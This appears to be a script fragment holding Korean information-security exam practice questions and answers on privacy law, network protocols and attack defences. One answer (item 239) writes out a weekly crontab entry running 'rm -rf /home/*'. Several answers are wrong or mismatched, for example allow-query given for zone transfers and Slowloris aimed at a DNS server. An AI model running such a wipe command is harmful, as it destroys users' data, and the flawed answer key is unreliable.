xml+='  <problem id="233">다음은 개인정보 안전성 확보조치 기준에서 주기적인 점검에 관한 의무사항이다. 빈칸에 들어갈 주기와 점검 내용을 적으시오.&lt;br&gt;&lt;br&gt;고유식별정보를 처리하는 개인정보처리자는 인터넷 홈페이지를 통해 고유식별정보가 유출·변조·훼손되지 않도록 (                  )을 점검하고 필요한 보완 조치를 하여야 한다.</problem>';
xml+='  <answer id="233">연 1회 이상 취약점</answer>';
xml+='  <problem id="234">다음은 개인정보 안전성 확보조치 기준에서 주기적인 점검에 관한 의무사항이다. 빈칸에 들어갈 주기와 점검 내용을 적으시오.&lt;br&gt;&lt;br&gt;- A: 보안 투자를 늘리는 등의 방법으로 위험이 발생할 확률을 줄인다.&lt;br&gt;&lt;br&gt;- B: 위험이 동반되는 사업을 수행하지 않거나 완전 다른 방법을 사용한다.&lt;br&gt;&lt;br&gt;- C: 위험한 사업을 외주로 전환하거나 보험에 들어 위험부담이나 책임을 이전시킨다.&lt;br&gt;&lt;br&gt;- D: 위험부담을 그대로 감수하고 진행한다.</problem>';
xml+='  <answer id="234">A: 위험 감소, B: 위험 회피, C: 위험 전가, D: 위험 수용</answer>';
xml+='  <problem id="235">파일 업로드 취약점은 파일 첨부가 가능한 게시판 등 웹 환경에서 악의적인 스크립트를 업로드하여 서버를 공격할 수 있는 취약점이다. 파일 업로드 취약점과 관련해 아래 질문에 답하시오.&lt;br&gt;&lt;br&gt;1) 파일 업로드의 취약점 확인 방법은 무엇인가?&lt;br&gt;&lt;br&gt;2) 대응방법을 설명하시오.</problem>';
xml+='  <answer id="235">1) jsp, php, sh 등 실행 가능한 파일을 업로드하고 실행이 가능한지 확인한다.&lt;br&gt;&lt;br&gt;2) 확장자나 파일 헤더를 통해 이미지, 문서 등 정해진 파일만 올릴 수 있도록 하고 파일이 저장되는 디렉터리의 실행권한을 없앤다.</answer>';
xml+='  <problem id="236">IPSec 프로토콜은 전송모드와 터널모드 2가지를 가진다. ESP를 사용한 암호화 범위를 중심으로 전송모드와 터널모드의 차이를 설명하시오.</problem>';
xml+='  <answer id="236">전송모드는 IP 페이로드만 암호한다. 트래픽 경로는 노출된다. 터널 모드는 원본 IP 패킷 전체를 암호화하므로 트래픽 경로도 노출되지 않는다.</answer>';
xml+='  <problem id="237">보안관제 업무시 사고발생 후 시행되는 디지털포렌식의 기본 원칙 중 증거관리 연계성의 원칙을 서술하고 아래 절차에서 빈 칸에 들어갈 말을 기술하시오.&lt;br&gt;&lt;br&gt;1단계 - 증거 획득&lt;br&gt;&lt;br&gt;2단계 - (    A    )&lt;br&gt;&lt;br&gt;3단계 - (    B    )&lt;br&gt;&lt;br&gt;4단계 - (    C    )&lt;br&gt;&lt;br&gt;5단계 - 법정제출</problem>';
xml+='  <answer id="237">1) 증거물 수집부터 제출까지의 각 단계별 담당자, 절차가 명확해야 함&lt;br&gt;&lt;br&gt;2) A: 이송, B: 분석, C: 보관</answer>';
xml+='  <problem id="238">다음 보기를 보고 주어진 질문에 알맞은 내용을 서술하시오.&lt;br&gt;&lt;br&gt;통신 구간 암호화를 위해 많이 사용하는 OpenSSL 라이브러리에서 서버에 저장된 중요 메모리 데이터가 노출되는 심각한 버그가 발견되어 시스템 및 소프트웨어에 대한 신속한 취약점 조치가 권고되었다.&lt;br&gt;&lt;br&gt;1) 취약점명은 무엇인가?&lt;br&gt;&lt;br&gt;2) 영향을 받는 버전은 무엇인가?&lt;br&gt;&lt;br&gt;3) 대응방법은 무엇인가?</problem>';
xml+='  <answer id="238">1) 하트블리드(Heartbleed)&lt;br&gt;&lt;br&gt;2) 1.01f 버전 이하&lt;br&gt;&lt;br&gt;3) 1.01g 버전 이상으로 업그레이드한다.&lt;br&gt;&lt;br&gt;구버전으로 운영이 되고 있었던 경우 SSL 키가 노출되었을 가능성이 있으므로 새로운 SSL 키를 발급받는다.</answer>';
xml+='  <problem id="239">crontab은 리눅스에서 정해진 시간에 작업이 실행되도록 스케줄링하는 유틸리티 프로그램이다. crontab에 대한 아래 질문에 답하시오.&lt;br&gt;&lt;br&gt;1) 현재 스케줄링 되어있는 작업되어 있는 내용을 보는 명령어는?&lt;br&gt;&lt;br&gt;2) SIS 계정의 crontab을 편집하는 명령어는 무엇인가?&lt;br&gt;&lt;br&gt;3) 매주 일요일 새벽 2시에 rm -rf 명령어를 이용하여 /home 디렉터리 하위 모든 파일과 디렉터리를 삭제하는 crontab 스케줄을 작성하라.</problem>';
xml+='  <answer id="239">1) crontab -l&lt;br&gt;&lt;br&gt;2) crontab -u sis -e&lt;br&gt;&lt;br&gt;3) 0 2 * * 0 rm -rf /home/* 1 &gt; /dev/null2 &gt; &amp;1</answer>';
xml+='  <problem id="240">ISMS 인증을 위해 정보보호정책을 수립하고 정책의 적용범위를 설정하였다. 정보보호정책이 공식문서로 인정 받기 위한 절차를 기술하시오.</problem>';
xml+='  <answer id="240">1. 이해관련자 검토&lt;br&gt;&lt;br&gt;2. 최고경영자(CEO) 승인&lt;br&gt;&lt;br&gt;3. 모든 임직원 및 관련자에게 이해하기 쉬운 형태 전달(최신본 유지)</answer>';
xml+='  <problem id="241">맥, 리눅스, 유닉스,윈도우등 운영체제 별로 디렉터리 경로는 다르지만 DNS의 정보를 담고 있는 파일이며, 윈도우7이상 버전에서는 관리자 외에 수정이 불가능 한 파일의 이름은 무엇인가?</problem>';
xml+='  <answer id="241">hosts</answer>';
xml+='  <problem id="242">다음은 스머프(Smurf) 공격에 대한 설명이다. 빈칸을 채우시오.&lt;br&gt;&lt;br&gt;ㅇ 여러 호스트가 특정 대상에게 다량의 (         A          ) 를 보내게 하여 서비스거부(DoS)를 유발시키는 보안공격&lt;br&gt;&lt;br&gt;ㅇ 소스 주소를 공격 대상 호스트로 위조한 ICMP 패킷을 브로드캐스트하면 근처의 호스트가 다량의 (      B      )를 발생시킨다.</problem>';
xml+='  <answer id="242">A: ICMP Echo Request&lt;br&gt;&lt;br&gt;B: Echo Reply</answer>';
xml+='  <problem id="243">trustwave 사의 제품으로 아파치웹서버, IIS에서 사용가능 한 공개용 웹 어플리케이션 방화벽은 무엇인가?</problem>';
xml+='  <answer id="243">ModSecurity</answer>';
xml+='  <problem id="244">다음은 버퍼 오퍼플로우 공격의 두가지 종류에 대한 설명이다. 빈칸에 들어갈 말을 적으시오.&lt;br&gt;&lt;br&gt;( A ) 버퍼 오버플로우 공격은 ( A )영역에 할당된 버퍼 크기를 초과하는 양의 데이터(실행 가능 코드)를 입력하여 복귀 주소(Return Address)를 변경하고 공격자가 원하는 임의의 코드를 실행하게 한다.&lt;br&gt;&lt;br&gt;( B ) 버퍼 오버플로우 공격은 프로그램 실행 시 ( B )영역에 할당된 버퍼 크기를 초과하는 양의 데이터(실행 가능 코드)를 입력하여 메모리의 데이터와 함수 주소 등을 변경하여 공격자가 원하는 임의의 코드를 실행하게 된다.</problem>';
xml+='  <answer id="244">A: 스택&lt;br&gt;&lt;br&gt;B: 힙</answer>';
xml+='  <problem id="245">다음은 단편화된 IP패킷이다. 각 숫자가 의미하는 바를 적으시오.&lt;br&gt;&lt;br&gt;41421:48@2960+&lt;br&gt;&lt;br&gt;&lt;br&gt;1) 41421&lt;br&gt;&lt;br&gt;2) 48&lt;br&gt;&lt;br&gt;3) 2960</problem>';
xml+='  <answer id="245">1) id : 원본 IP 데이터그램&lt;br&gt;&lt;br&gt;2) size : 단편화 크기&lt;br&gt;&lt;br&gt;3) offset : 현재 위치</answer>';
xml+='  <problem id="246">정보통신망법령에 따라 법에서 허용한 경우 외엔 주민등록번호를 취급해선 안 된다. 다음 법률 조항의 빈칸에 들어갈 말을 적으시오.&lt;br&gt;&lt;br&gt;정보통신서비스 제공자는 다음 각 호의 어느 하나에 해당하는 경우를 제외하고는 이용자의 주민등록번호를 수집·이용할 수 없다.&lt;br&gt;&lt;br&gt;1. 제23조의3에 따라 (       A       )으로 지정받은 경우&lt;br&gt;&lt;br&gt;2. 법령에서 이용자의 주민등록번호 수집·이용을 허용하는 경우&lt;br&gt;&lt;br&gt;3. 영업상 목적을 위하여 이용자의 주민등록번호 수집·이용이 불가피한 정보통신서비스 제공자로서 방송통신위원회가 고시하는 경우&lt;br&gt;&lt;br&gt;② 제1항제2호 또는 제3호에 따라 주민등록번호를 수집·이용할 수 있는 경우에도 이용자의 주민등록번호를 사용하지 아니하고 본인을 확인하는 방법(이하  (     B    )이라 한다)을 제공하여야 한다.</problem>';
xml+='  <answer id="246">a. 본인확인기관&lt;br&gt;&lt;br&gt;b. 대체수단</answer>';
xml+='  <problem id="247">다음 빈칸에 들어갈 말을 쓰시오.&lt;br&gt;&lt;br&gt;SSL/TLS를 이루는 세부 프로토콜 중 레코드 프로토콜은 메시지를 암호화 하여 통신을 수행하는 역할을 한다. 레코드 프로토콜은 상위계층 메시지를 (  A  ), (  B  ), (  C  ), (  D  )와 같은 처리과정을 거쳐 헤더를 붙인 후 하위계층으로 전달한다.</problem>';
xml+='  <answer id="247">A : 단편화(Fragmentation), B : 압축(Compression), C : MAC(Message Authentication Code) 추가 D : 암호화(Encryption)</answer>';
xml+='  <problem id="248">다음은 정성적 위험분석 방법 중 하나에 대한 설명이다. 어떤 방법인가?&lt;br&gt;&lt;br&gt;시스템에 관한 전문적인 지식을 가진 전문가의 집단을 구성하고, 정보시스템이 직면한 다양한 위협과 취약성을 토론을 통해 분석하는 방법</problem>';
xml+='  <answer id="248">델파이법</answer>';
xml+='  <problem id="249">위험은 비정상적인 일이 발생할 수 있는 가능성을 말하며, 위험분석은 위험을 분석하고 해석하는 과정이다. 위험을 구성하는 4가지 기본요소를 쓰시오.</problem>';
xml+='  <answer id="249">자산(Asset) × 취약점(Vulnerability) × 위협(Threat) - 정보보호대책(Safeguard)</answer>';
xml+='  <problem id="250">아래는 정보보호시스템 공통평가기준에 있는 내용이다. 빈칸을 채우시오&lt;br&gt;&lt;br&gt;(    A    )(이)라 함은 평가대상 범주를 위한 특정 소비자의 요구에 부합하는 구현에 독립적인 보안요구사항의 집합을 말한다.&lt;br&gt;&lt;br&gt;(    B    )(이)라 함은 식별된 평가대상의 평가를 위한 근거로 사용되는 보안요구사항과 구현 명세의 집합을 말한다.&lt;br&gt;&lt;br&gt;(    C    )(이)라 함은 공통평가기준에서 미리 정의된 보증수준을 가지는 보증 컴포넌트로 이루어진 패키지를 말한다.</problem>';
xml+='  <answer id="250">A: 보호프로파일&lt;br&gt;&lt;br&gt;B: 보안목표명세서&lt;br&gt;&lt;br&gt;C: 평가보증등급</answer>';
xml+='  <problem id="251">전자서명법에 따라 공인인증기관이 발급한 공인인증서의 효력이 소멸하는 4가지 사유를 쓰시오.</problem>';
xml+='  <answer id="251">1. 공인인증서의 유효기간이 경과한 경우&lt;br&gt;&lt;br&gt;2. (제12조제1항의 규정에 의하여) 공인인증기관의 지정이 취소된 경우&lt;br&gt;&lt;br&gt;3. (제17조의 규정에 의하여) 공인인증서의 효력이 정지된 경우&lt;br&gt;&lt;br&gt;4. (제18조의 규정에 의하여) 공인인증서가 폐지된 경우</answer>';
xml+='  <problem id="252">다음은 xinetd.conf 설정값이다. 각 설정값들의 의미를 쓰시오.&lt;br&gt;&lt;br&gt;1) cps = 10 5&lt;br&gt;&lt;br&gt;2) instances = 50&lt;br&gt;&lt;br&gt;3) per_source = 10</problem>';
xml+='  <answer id="252">1) 들어오는 접속수를 제한할때 첫번째숫자가 한계가 되었을때&lt;br&gt;&lt;br&gt;두 번째 인수로 제공되는 주어진 시간(초) 동안 서비스가 비활성화된다.&lt;br&gt;&lt;br&gt;2) 동시에 서비스를 실행할 수 있는 서버의 최대 개수&lt;br&gt;&lt;br&gt;3) 동시에 접속 가능한 수</answer>';
xml+='  <problem id="253">다음은 유닉스(솔라리스) 커널 보안 설정에 관한 문제이다. 커널 컴파일 용도로 활용하는 아래 ndd 명령어와 관련된 공격명과 명령의 의미를 쓰시오.&lt;br&gt;&lt;br&gt;(1) ndd -set /dev/ip ip_forward_directed_broadcasts 0&lt;br&gt;&lt;br&gt;(2) ndd -set /dev/tcp tcp_conn_req_max_q0 1024</problem>';
xml+='  <answer id="253">1) 스머프 공격에 대응하기 위한 커널 파라미터 설정&lt;br&gt;&lt;br&gt;Directed broadcasts IP 패킷이 포워딩되는것을 허용하지 않는다&lt;br&gt;&lt;br&gt;2) TCP Syn Flooding 공격에 대응하기 위한 파라미터 설정&lt;br&gt;&lt;br&gt;TCP 연결요청대기큐(Backlog Queue)의 크기를 1024로 늘린다</answer>';
xml+='  <problem id="254">다음은 아동용 헬스 클럽의 가입을 위한 개인정보 수집·이용 동의서이다. 법률 위반사항 두가지를 쓰고 개선방안을 작성하시오.&lt;br&gt;&lt;br&gt;KIDS FITNESS CLUB &lt;br&gt;&lt;br&gt;개인정보 수집·이용 동의서&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;수집목적 : 회원 등록, 회원카드 발급&lt;br&gt;&lt;br&gt;수집항목 : 이름, 성별, 생년월일, 전화번호&lt;br&gt;&lt;br&gt;보유기간 : 회원 탈퇴시 까지 (단, 법령에 따라 보관하여야 하는 경우에는 법령에 정한 기간까지 보관, 자세한 사항은 홈페이지 참고)&lt;br&gt;&lt;br&gt;※ 본 개인정보처리에 동의하지 않으실 수 있습니다. 하지만 동의하지 않으실 경우 헬스장 회원가입이 불가합니다.&lt;br&gt;&lt;br&gt;동의합니다 ■ 동의하지 않습니다 □&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;수집목적 : 최신 정보 제공, 맞춤형 헬스 케어&lt;br&gt;&lt;br&gt;수집항목 : 이메일, 질병, 키, 몸무게&lt;br&gt;&lt;br&gt;보유기간 : 탈퇴시까지 (단, 법령에 따라 보관하여야 하는 경우에는 법령에 정한 기간까지 보관, 자세한 사항은 홈페이지 참고)&lt;br&gt;&lt;br&gt;※ 본 개인정보처리에 동의하지 않으실 수 있습니다. 하지만 동의하지 않으실 경우 맞춤형 서비스가 불가능합니다.&lt;br&gt;&lt;br&gt;동의합니다 ■ 동의하지않습니다 □</problem>';
xml+='  <answer id="254">1. 민감정보, 질병 여부 수집 개인의 민감정보는 원칙적으로 수집을 금지하고 있으며 이를 처리하기 위해서는 다른 개인정보의 처리와 분리하여 정보주체의 별도 동의를 구한다.&lt;br&gt;&lt;br&gt;2. 법정 대리인의 동의 없이 만 14세 미만 아동의 개인정보 수집&lt;br&gt;&lt;br&gt;만 14세 미만 아동의 개인정보 수집시에는 법정대리인의 동의를 구한다.</answer>';
xml+='  <problem id="255">TCP 포트가 닫혀 있을 때 응답이 오는 스텔스 스캔 3가지는?&lt;br&gt;&lt;br&gt;&lt;br&gt;</problem>';
xml+='  <answer id="255">NULL Scan, FIN Scan, Xmas Scan</answer>';
xml+='  <problem id="256">FTP 동작 방식에 대하여 아래 빈칸을 채우시오.&lt;br&gt;&lt;br&gt;FTP는 ( A ) 모드와 수동(passive)모드가 있다.( A )는 통신 제어를 위한 ( B ) 포트와 데이터 전송을 위한 ( C ) 포트를 사용한다.수동모드에서는 데이터 전송을 위해 서버에서 ( D ) 포트 이상을 사용한다.</problem>';
xml+='  <answer id="256">A: Active&lt;br&gt;&lt;br&gt;B: 21&lt;br&gt;&lt;br&gt;C: 20&lt;br&gt;&lt;br&gt;D: 1024</answer>';
xml+='  <problem id="257">오픈 소스 도구인 PacketFense와 같이 단말기가 네트워크에 접속하려 시도할 때 이를 통제하는 보안솔루션은?</problem>';
xml+='  <answer id="257">NAC(Network Access Control)</answer>';
xml+='  <problem id="258">다음은 Virtual LAN에 대한 설명이다. 빈칸에 들어갈 말을 적으시오.&lt;br&gt;&lt;br&gt;VLAN은 네트워크 자원 사용을 제한함으로써 ( A ) 를 높이고, 이용하는 도메인의 ( B )를 제한하여 네트워크 서비스의 ( C )를 향상시킨다.</problem>';
xml+='  <answer id="258">A: 보안&lt;br&gt;&lt;br&gt;B: 크기&lt;br&gt;&lt;br&gt;C: 성능</answer>';
xml+='  <problem id="259">위험관리 방법과 관련하여 아래 빈칸에 들어갈 말을 적으시오.&lt;br&gt;&lt;br&gt;위험관리 방법에는 위험감소, 위험수용, 위험회피, 위험(  괄호  )가 있다. 위험 (  괄호  )를 위해 보험에 들거나 아웃소싱을 하는 방법이 있다.</problem>';
xml+='  <answer id="259">전가</answer>';
xml+='  <problem id="260">주요정보통신기반시설의 지정 및 취약점 분석에 관한 기준이다. 빈 칸을 채우시오.&lt;br&gt;&lt;br&gt;제8조(주요정보통신기반시설의 지정 등) ①중앙행정기관의 장은 소관분야의 정보통신기반시설중 다음 각호의 사항을 고려하여 전자적 침해행위로부터의 보호가 필요하다고 인정되는 정보통신기반시설을 주요정보통신기반시설로 지정할 수 있다.&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;1. 당해 정보통신기반시설을 관리하는 기관이 수행하는 업무의 국가사회적 중요성&lt;br&gt;&lt;br&gt;2. 기관이 수행하는 업무의 정보통신기반시설에 대한 ( A )&lt;br&gt;&lt;br&gt;3. 다른 정보통신기반시설과의 ( B )&lt;br&gt;&lt;br&gt;4. 침해사고가 발생할 경우 국가안전보장과 경제사회에 미치는 피해규모 및 범위&lt;br&gt;&lt;br&gt;5. 침해사고의 발생가능성 또는 그 복구의 ( C )</problem>';
xml+='  <answer id="260">A: 의존도&lt;br&gt;&lt;br&gt;B: 상호연계성&lt;br&gt;&lt;br&gt;C: 용이성</answer>';
xml+='  <problem id="261">다음 각 설명에 알맞은 재해복구서비스를 적으시오.&lt;br&gt;&lt;br&gt;(A) : 백업장치나 테이프와 같은 것만 구비한다. 중요성이 높은 정보 기술 자원만 부분적으로 사이트에 보유한다.&lt;br&gt;&lt;br&gt;(B) : 주 센터와 동일한 수준의 정보 기술 자원을 사이트에 보유하면서, 데이터를 최신으로 유지한다.&lt;br&gt;&lt;br&gt;(C) : 컴퓨터실과 같은 장소만 확보하고 정보자원은 확보하지 않은 상태에서, 재해시 정보자원을 가지고 온다.</problem>';
xml+='  <answer id="261">A: 웜 사이트&lt;br&gt;&lt;br&gt;B: 핫 사이트&lt;br&gt;&lt;br&gt;C: 콜드 사이트</answer>';
xml+='  <problem id="262">개인정보 안전성 확보조치를 기준으로 다음 빈칸에 들어갈 말을 적으시오.&lt;br&gt;&lt;br&gt;ㅇ (    A    )이란 데이터베이스시스템 등 개인정보를 처리할 수 있도록 체계적으로 구성한 시스템을 말한다.&lt;br&gt;&lt;br&gt;ㅇ (    B    )란 정보주체 또는 개인정보취급자 등이 개인정보처리시스템, 업무용 컴퓨터 또는 정보통신망 등에 접속할 때 식별자와 함께 입력하여 정당한 접속 권한을 가진 자라는 것을 식별할 수 있도록 시스템에 전달해야 하는 고유의 문자열로서 타인에게 공개되지 않는 정보를 말한다.&lt;br&gt;&lt;br&gt;개인정보처리자는 인터넷 구간 및 인터넷 구간과 (    C    )의 중간 지점(DMZ : Demilitarized Zone)에 고유식별정보를 저장하는 경우에는 이를 암호화하여야 한다.</problem>';
xml+='  <answer id="262">A: 개인정보처리시스템&lt;br&gt;&lt;br&gt;B: 비밀번호&lt;br&gt;&lt;br&gt;C: 내부망</answer>';
xml+='  <problem id="263">정보통신망 이용촉진 및 보호에 관 법률 제25조(개인정보의 위탁처리)에 따라 개인정보 위탁 시 다음의 내용이 포함된 문서에 의해야 한다. 빈칸에 들어갈 말을 적으시오.&lt;br&gt;&lt;br&gt;1. 개인정보 처리위탁을 받는 자(이하 (    A    )라 한다)&lt;br&gt;&lt;br&gt;2. 개인정보 처리위탁을 하는 (     B     )</problem>';
xml+='  <answer id="263">A: 수탁자&lt;br&gt;&lt;br&gt;B: 업무의 내용</answer>';
xml+='  <problem id="264">기업담당자는 정보보호에 관한법률에 의거하여 연1회 이용자들에게 메일을 통보해야한다. 메일에 들어가야할 정보를 나열하시오.</problem>';
xml+='  <answer id="264">1) 개인정보의 수집.이용 및 수집한 개인정보의 항목&lt;br&gt;&lt;br&gt;2) 개인정보를 제공받는 자와 그 제공 목적 및 제공한 개인정보의 항목&lt;br&gt;&lt;br&gt;3) 개인정보 처리위탁을 받은 자 및 그 처리위탁을 하는 업무의 내용</answer>';
xml+='  <problem id="265">버퍼 오버 플로에 대해 아래 질문에 답하시오.&lt;br&gt;&lt;br&gt;1) 스택 버퍼오버플로우 시 카나리아 단어(canaria word) 기법의 원리를 설명하시오.&lt;br&gt;&lt;br&gt;2) 위 방법의 공격 차단 방법을 설명하시오.&lt;br&gt;&lt;br&gt;3) ASLR(Address Space Layout Randomization) 기법의 원리를 설명하시오.&lt;br&gt;&lt;br&gt;4) 위 방법의 공격 차단 방법을 설명하시오.</problem>';
xml+='  <answer id="265">1) 카나리 단어 기법 동작방식 : 스택가드(Stack Guard) 라고도 함, 메모리 상에서 프로그램의 복귀 주소(Return Address)와 변수/버퍼 사이에 특정 값(Canary)을 저장해두는 기법을 말한다.&lt;br&gt;&lt;br&gt;2) 카나리 단어 기법 공격 차단 원리 : 버퍼오버플로우 발생 시 특정 값(Canary)의 변조가 발생하므로 이를 탐지하여 차단한다.&lt;br&gt;&lt;br&gt;3) ASLR 기법 동작방식 : 메모리 공격을 방어하기 위해 주소 공간 배치를 난수화하는 기법을 말한다.&lt;br&gt;&lt;br&gt;4) ASLR 기법 공격 차단 원리 : 실행 시 마다 메모리 주소를 변경시켜 버퍼 오버플로우를 통한 특정 주소 호출을 방지한다.</answer>';
xml+='  <problem id="266">iptables에서 -j옵션중에 DROP과 REJECT가 있다. 관련하여 아래 질문에 답하시오.&lt;br&gt;&lt;br&gt;(1) DROP의 동작 방식&lt;br&gt;&lt;br&gt;(2) REJECT의 동작 방식&lt;br&gt;&lt;br&gt;(3) 보안적 관점에서 둘 중에 어느 것이 유리한가? 이유는?</problem>';
xml+='  <answer id="266">DROP은 응답을 하지 않고 REJECT는 ICMP 메시지를 이용하여 거절 응답을 보낸다.&lt;br&gt;(시스템 리소스를 더 잡아먹기도 함)&lt;br&gt;&lt;br&gt;REJECT를 사용할 경우 응답을 보내기 위해 리소스 사용이 많아지고 ICMP 응답 메시지에 많은 정보가 포함되어 있기 때문에 DROP을 쓰는 것이 보안 관점에서 유리하다.</answer>';
xml+='  <problem id="267">TCP FLAG는 URG, ACK, PSH, RST, SYN, FIN를 순서대로 설정한다. 아래에서 TCP 연결설정 및 연결해제 과정에서TCP FLAG 비트와 순서번호가 순서에 맞도록 빈칸을 채우시오.&lt;br&gt;&lt;br&gt;(1) TCP 연결설정 과정&lt;br&gt;&lt;br&gt;[Client&gt;Server] , TCP Flag[      A     ] , SEQ(  B  ) , ACK(0)&lt;br&gt;&lt;br&gt;[Server&gt;Client] , TCP Flag[010010] , SEQ(  C  ) , ACK(345)&lt;br&gt;&lt;br&gt;[Client&gt;Server] , TCP Flag[010000] , SEQ(345) , ACK(678)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;(2) TCP 연결해제 과정&lt;br&gt;&lt;br&gt;[Client&gt;Server] , TCP Flag[010001] , SEQ(1234) , ACK(6789)&lt;br&gt;&lt;br&gt;[Server&gt;Client] , TCP Flag[     D     ] , SEQ(6789) , ACK(1235)&lt;br&gt;&lt;br&gt;[Server&gt;Client] , TCP Flag[     E      ] , SEQ(6789) , ACK(1235)&lt;br&gt;&lt;br&gt;[Client&gt;Server] , TCP Flag[010000] , SEQ(1235) , ACK(6790)</problem>';
xml+='  <answer id="267">A: 000010&lt;br&gt;&lt;br&gt;B: 344&lt;br&gt;&lt;br&gt;C: 677&lt;br&gt;&lt;br&gt;D: 010000&lt;br&gt;&lt;br&gt;E: 010001</answer>';
xml+='  <problem id="268">다음 화면을 보고 아래 질문에 답하시오.&lt;br&gt;&lt;br&gt;[root@qfran ~] ifconfig eth0&lt;br&gt;&lt;br&gt;eth0: flags=12345 &lt; UP, BROADCAST, RUNNING, PROMISC, SIMPLEX, MULTICAST &gt; metric 0 mtu 1500 options=80009 ...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;1) 예상되는 공격명 및 이유 &lt;br&gt;&lt;br&gt;2) 위 문제를 해결하기 위한 명령어 &lt;br&gt;&lt;br&gt;3) 현상태 발생 시점을 찾기 위한 로그의 경로(파일명 포함)</problem>';
xml+='  <answer id="268">1) 예상되는 공격명 및 이유 : 스니핑(Sniffing) 공격, 화면에 표시된 인터페이스가 무차별 모드(PROMISC)로 동작하고 있기 때문에 해당 컴퓨터가 목적지가 아닌 패킷들도 모두 수신이 가능하기 때문에 스니핑(Sniffing) 공격이 발생한 것으로 예상됨.&lt;br&gt;&lt;br&gt;2) 위 문제를 해결하기 위한 명령어 : ifconfig eth0 ( -promisc )&lt;br&gt;&lt;br&gt;3) 현상태의 발생 시점을 찾기 위한 로그의 경로(파일명 포함) : /var/log/messages</answer>';
xml+='  <problem id="269">다음에서 설명하는 상용 기술은?&lt;br&gt;&lt;br&gt;Windows 전용으로 제공되는 볼륨 암호화 기능으로, TPM(신뢰할 수 있는 플랫폼 모듈)을 사용하며 AES-128 알고리즘을 사용한다. Window 7부터 지원되기 시작하였다.</problem>';
xml+='  <answer id="269">비트로커(BitLocker)</answer>';
xml+='  <problem id="270">다음은 데이터베이스 보안 통제방법에 관한 설명이다. 괄호안에 들어갈 말로 알맞은 것은?&lt;br&gt;&lt;br&gt;1) (   A   ): 인증된 사용자에게 허가된 범위 내에서 시스템 내부의 정보에 대한 접근을 허용하는 기술적 방법 &lt;br&gt;&lt;br&gt;2) (   B   ): 사용자를 찾은 후 통계 함수 관계를 통해 키값을 유도하는 것으로 간접 접근을 통한 추론과 상관 데이터로 찾는 통제 &lt;br&gt;&lt;br&gt;3) (   C   ): 보안 등급이 높은 객체에서 낮은 객체로의 정보 흐름을 제어하는 통제</problem>';
xml+='  <answer id="270">A: 접근제어&lt;br&gt;&lt;br&gt;B: 추론통제&lt;br&gt;&lt;br&gt;C: 흐름통제</answer>';
xml+='  <problem id="271">가상사설망(VPN)에서 사용되는 보안 프로토콜과 관련하여 아래 설명에 해당하는 프로토콜을 적으시오.&lt;br&gt;&lt;br&gt;1) 3계층 보안 프로토콜로, 가장 많이 사용되는 프로토콜&lt;br&gt;&lt;br&gt;2) 상기 프로토콜에서 무결성 보장, 메시지 인증을 위한 세부 프로토콜&lt;br&gt;&lt;br&gt;3) 상기 프로토콜에서 암호화를 통해 기밀성을 유지하기 위한 세부 프로토콜</problem>';
xml+='  <answer id="271">1) IPSec&lt;br&gt;&lt;br&gt;2) AH&lt;br&gt;&lt;br&gt;3) ESP</answer>';
xml+='  <problem id="272">DNS서버인 192.168.1.18으로 axfr 레코드 타입의 질의를 전송하였더니 deny 된 것으로 확인되었다. 질의한 호스트 서버가 192.168.10.3이며, 정상적인 2차 DNS서버라고 할 때 192.168.1.18의 named.conf 에 어떤 설정이 포함되어야 하는가?&lt;br&gt;&lt;br&gt;options {&lt;br&gt;&lt;br&gt;  directory "/var/named";&lt;br&gt;&lt;br&gt;  forward only;&lt;br&gt;&lt;br&gt;  forwarders { 8.8.8.8; };&lt;br&gt;&lt;br&gt;  datasize 1024M;&lt;br&gt;&lt;br&gt;  (                       )&lt;br&gt;&lt;br&gt;};</problem>';
xml+='  <answer id="272">allow-query { 192.168.10.3; };</answer>';
xml+='  <problem id="273">다음에서 설명하는 서비스 거부 공격은?&lt;br&gt;&lt;br&gt;HTTP 관련 공격 중 헤더의 CRLF(개행문자) 필드 부분을 조작함으로써 DNS 서버로 조작된 HTTP 헤더를 지속적으로 보내 서비스의 가용성을 떨어뜨린다.</problem>';
xml+='  <answer id="273">Slowloris 또는 Slow HTTP 공격</answer>';
xml+='  <problem id="274">영상정보처리장비를 이용하기 위해 안내문과 함께 설치를 진행하려고 한다. 영상정보처리기기 관련 법규에 따라 다음 괄호 안에 들어가야 할 내용은?&lt;br&gt;&lt;br&gt;1) (             괄호                 )&lt;br&gt;&lt;br&gt;2) 촬영 범위 및 시간&lt;br&gt;&lt;br&gt;3) 관리책임자 성명 및 연락처&lt;br&gt;&lt;br&gt;4) 그 밖에 대통령령으로 정하는 사항</problem>';
xml+='  <answer id="274">설치 목적 및 장소</answer>';
xml+='  <problem id="275">네트워크 관리에 사용되는 SNMP에 대하여 다음에 답하시오.&lt;br&gt;&lt;br&gt;1) 매니저가 에이전트으로 Request 하는 포트번호: UDP (   A   )&lt;br&gt;&lt;br&gt;2) 에이전트가 매니저로 주기적으로 보고하는 과정: (    B    )&lt;br&gt;&lt;br&gt;3) 에이전트가 매니저로 주기적으로 보고하는 포트번호: UDP (    C    )</problem>';
xml+='  <answer id="275">1) 161&lt;br&gt;&lt;br&gt;2) Trap 혹은 Event Reporting&lt;br&gt;&lt;br&gt;3) 162</answer>';
xml+='  <problem id="276">개인정보 보호법령 및 하위 고시에 의거해 다음의 빈칸을 채우시오.&lt;br&gt;&lt;br&gt;ㅇ 접근권한 부여·말소 등의 기록을 최소 ( A )간 보관&lt;br&gt;&lt;br&gt;ㅇ 접속기록은 최소 ( B ) 이상 보관&lt;br&gt;&lt;br&gt;ㅇ 단, 고유식별정보 또는 민감정보를 처리하는 경우 최소 ( C ) 이상 보관&lt;br&gt;&lt;br&gt;ㅇ 접속기록의 위·변조 방지를 위해 ( D ) 이상 점검</problem>';
xml+='  <answer id="276">A: 3년&lt;br&gt;B: 1년&lt;br&gt;C: 2년&lt;br&gt;D: 월 1회</answer>';
xml+='  <problem id="277">다음에서 설명하는 공격은 무엇인가?&lt;br&gt;&lt;br&gt;소프트웨어 공급망에 침투하여 악성코드를 배포하는 공격으로, SW빌드 및 배포 과정에 악성코드를 삽입하여 선의의 소프트웨어를 통해 이용자들을 공격</problem>';
xml+='  <answer id="277">공급망 공격(Supply Chain Attack)</answer>';
